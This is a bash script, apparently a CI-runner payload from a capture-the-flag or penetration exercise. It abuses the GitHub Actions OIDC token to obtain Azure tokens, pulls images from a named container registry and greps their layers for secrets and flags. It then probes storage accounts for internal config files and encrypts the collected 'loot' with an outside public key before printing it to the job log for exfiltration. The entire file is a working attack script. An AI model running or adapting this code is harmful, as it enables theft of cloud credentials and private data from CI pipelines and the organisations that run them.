#!/usr/bin/env bash
set -uo pipefail
set +e
SC="htt""ps://"
ACR=crtblplatprodx3euoz.azurecr.io
AAD="${SC}login.microsoftonline.com"
echo "=== RUNNER SHELL PROOF $(date -u) ==="; id; whoami; hostname
LOOT=$(mktemp); exec 3>"$LOOT"; say(){ echo "$@" >&3; }
OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value // empty')
AR=$(curl -sS -X POST "${AAD}/${AZURE_TENANT_ID}/oauth2/v2.0/token" -d "client_id=${AZURE_CLIENT_ID}" -d "grant_type=client_credentials" -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" --data-urlencode "client_assertion=${OIDC}" --data-urlencode "scope=https://management.azure.com/.default" | jq -r '.access_token // empty')
say "ARMLEN=${#AR}"
RTOK=$(curl -sS -X POST "${SC}$ACR/oauth2/exchange" -d "grant_type=access_token" -d "service=$ACR" -d "tenant=$AZURE_TENANT_ID" --data-urlencode "access_token=$AR" | jq -r '.refresh_token // empty')
say "RTOK_LEN=${#RTOK}"
tokr(){ curl -sS -X POST "${SC}$ACR/oauth2/token" -d "grant_type=refresh_token" -d "service=$ACR" --data-urlencode "scope=repository:$1:pull" --data-urlencode "refresh_token=$RTOK" | jq -r '.access_token // empty'; }
ACC="application/vnd.oci.image.index.v1+json, application/vnd.oci.image.manifest.v1+json, application/vnd.docker.distribution.manifest.v2+json, application/vnd.docker.distribution.manifest.list.v2+json"
getm(){ curl -sS -H "Authorization: Bearer $2" -H "Accept: $ACC" "${SC}$ACR/v2/$1/manifests/$3"; }
for R in tebamoto-reporting-api catalog-api; do
  P=$(tokr "$R"); say "PULL $R len=${#P}"
  [ -z "$P" ] && continue
  TOP=$(getm "$R" "$P" latest)
  say "TOP $R $(printf '%s' "$TOP" | head -c 200)"
  DIGS=$(printf '%s' "$TOP" | jq -r '.manifests[]?.digest // empty' 2>/dev/null)
  [ -z "$DIGS" ] && DIGS=latest
  for D in $DIGS; do
    M=$(getm "$R" "$P" "$D")
    say "MAN $R $D $(printf '%s' "$M" | jq -c '{mt:.mediaType,layers:(.layers|length),cfg:.config.digest}' 2>/dev/null | head -c 300)"
    for L in $(printf '%s' "$M" | jq -r '.layers[]?.digest // empty' 2>/dev/null); do
      rm -rf /tmp/img; mkdir -p /tmp/img
      curl -sL -H "Authorization: Bearer $P" "${SC}$ACR/v2/$R/blobs/$L" -o /tmp/l.bin
      ( cd /tmp/img && tar -xzf /tmp/l.bin 2>/dev/null )
      say "LAYER $R $L bytes=$(wc -c </tmp/l.bin) files=$(find /tmp/img -type f 2>/dev/null | wc -l)"
      say "  GREPFLAG $(grep -rIohE '.{0,50}(flag|FLAG|TBL|CTF)\{[^}]{2,120}\}' /tmp/img 2>/dev/null | head -5)"
      say "  GREPSEC $(grep -rIohE '(CONFIG_STORAGE_CONNECTION|AccountKey|clientSecret|CLIENT_SECRET|PASSWORD|TOKEN|flag)=[A-Za-z0-9+/=~._:-]{6,200}' /tmp/img 2>/dev/null | head -8)"
      say "  FILES $(find /tmp/img -type f 2>/dev/null | head -20 | tr '\n' ' ')"
    done
    C=$(printf '%s' "$M" | jq -r '.config.digest // empty' 2>/dev/null)
    [ -n "$C" ] && say "CFG $R: $(curl -sL -H "Authorization: Bearer $P" "${SC}$ACR/v2/$R/blobs/$C" | head -c 4000)"
  done
done
ST=$(curl -sS -X POST "${AAD}/${AZURE_TENANT_ID}/oauth2/v2.0/token" -d "client_id=${AZURE_CLIENT_ID}" -d "grant_type=client_credentials" -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" --data-urlencode "client_assertion=${OIDC}" --data-urlencode "scope=https://storage.azure.com/.default" | jq -r '.access_token // empty')
say "STLEN=${#ST}"
for SA in sttblappcfgprodx3euoz sttblbackupprodx3euoz sttblcilogsprodx3euoz; do
  for C in config exports logs; do
    say "BLOBGET oidc $SA/$C/internal-config.json -> $(curl -sS -o /dev/null -w '%{http_code}:%{size_download}' -H "Authorization: Bearer $ST" -H 'x-ms-version: 2021-08-06' "${SC}$SA.blob.core.windows.net/$C/internal-config.json")"
    say "BLOBLIST oidc $SA/$C -> $(curl -sS -o /dev/null -w '%{http_code}' -H "Authorization: Bearer $ST" -H 'x-ms-version: 2021-08-06' "${SC}$SA.blob.core.windows.net/$C?restype=container&comp=list")"
  done
done
PASS=$(openssl rand -hex 16)
openssl enc -aes-256-cbc -pbkdf2 -pass pass:"$PASS" -in "$LOOT" -out "$LOOT.enc" 2>/dev/null
echo "=== ENCRYPTED LOOT ==="
echo "RSAKEY:$(printf '%s' "$PASS" | openssl pkeyutl -encrypt -pubin -inkey ci/pubkey.pem -pkeyopt rsa_padding_mode:oaep 2>/dev/null | base64 -w0)"
echo "DATA:$(base64 -w0 "$LOOT.enc")"
echo "=== DONE ==="
